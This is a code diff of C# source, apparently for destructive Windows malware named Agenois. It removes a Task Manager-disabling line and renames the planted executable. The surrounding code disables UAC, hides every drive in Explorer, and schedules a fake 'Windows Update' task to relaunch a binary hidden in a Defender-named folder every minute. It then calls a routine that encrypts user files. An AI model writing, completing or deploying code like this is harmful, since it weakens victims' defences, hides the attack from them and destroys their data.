@@ -51,9 +51,6 @@ namespace Agenois
                 editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                 editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                 editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                editKey.SetValue("DisableTaskMgr", "1");
-                editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
@@ -184,7 +181,7 @@ namespace Agenois
                 LogonTrigger interval = new LogonTrigger();
                 interval.Repetition.Interval = TimeSpan.FromMinutes(1);
                 td.Triggers.Add(interval);
-                td.Actions.Add(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender" + @"\Abantes.exe", null));
+                td.Actions.Add(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender" + @"\Agenois.exe", null));
                 ts.RootFolder.RegisterTaskDefinition("Windows Update", td);
 
                 Destructive.EncryptUserFiles();
